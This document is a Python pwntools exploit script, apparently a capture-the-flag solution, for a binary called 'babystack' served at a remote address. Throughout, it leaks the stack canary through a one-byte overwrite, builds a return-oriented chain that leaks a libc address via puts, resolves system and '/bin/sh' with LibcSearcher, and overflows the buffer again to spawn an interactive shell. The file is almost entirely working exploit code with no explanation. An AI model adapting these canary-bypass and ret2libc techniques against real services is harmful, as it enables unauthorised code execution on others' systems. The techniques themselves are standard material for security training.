#coding:utf8
#!python
#!/usr/bin/env python
 
from pwn import *
 
context.log_level = 'debug'
process_name = 'babystack'
# p = process([process_name], env={'LD_LIBRARY_PATH':'./'})

elf = ELF(process_name)


io=remote('111.198.29.45', 31447)

def sendpayload(payload):
	io.sendlineafter('>> ',payload)
#first round read canary
#first use read to fill
offset2canary=0x90-0x8 #
def read_cannary():
	
	payload=bytes('1','ascii')
	#fill the last bytes of canary with 1
	sendpayload(payload)
	payload=bytes('a'*offset2canary,'ascii')+p8(1)
	io.send(payload)

	payload=bytes('2','ascii')
	sendpayload(payload)
	#recv offset2canary+6 bytes only 
	#canary_raw=u64(io.recvn(6)+b'\x00'*2)
	canary_raw=u64(io.recvn(144)[136:144])
	#canary_raw=u64(canary_raw[136:144])
	log.info("canary_raw => %#x", canary_raw)
	canary=canary_raw-1
	log.info("canary => %#x", canary)
	return canary
# this time i can control the return ,read read_address and return to .text
canary=read_cannary()
buffer_offset=0x90+0x8
payload=bytes('1','ascii')
sendpayload(payload)
pop_rdi=0x400a93 
read_got=elf.got['read']
put_plt=elf.plt['puts']
start=0x400720 # return to .text first begin
payload=bytes('a'*offset2canary,'ascii')+p64(canary)+bytes('a'*8,'ascii')+p64(pop_rdi)+p64(read_got)+p64(put_plt)+p64(start)
io.send(payload)
#还要跳出循环
payload='3'
sendpayload(payload)

#after loop
#read_addr=u64(io.recvn('6')+b'\x00'*2)
read_addr=u64(io.recvn(6)+b'\x00'*2)

#read_addr_raw=io.recvline()
#read_addr=u64(read_addr_raw[0:6]+b'\x00'*2)
log.info("read_addr => %#x", read_addr)
#caculate libc
from LibcSearcher import *
libc = LibcSearcher('read', read_addr)
libc_base = read_addr - libc.dump('read')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')

canary=read_cannary()
payload=bytes('1','ascii')
sendpayload(payload)
read_got=elf.got['read']
put_plt=elf.plt['puts']
start=0x400720 # return to .text first begin
payload=bytes('a'*offset2canary,'ascii')+p64(canary)+bytes('a'*8,'ascii')+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)+p64(start)
io.send(payload)

#还要跳出循环
payload='3'
sendpayload(payload)
io.interactive()

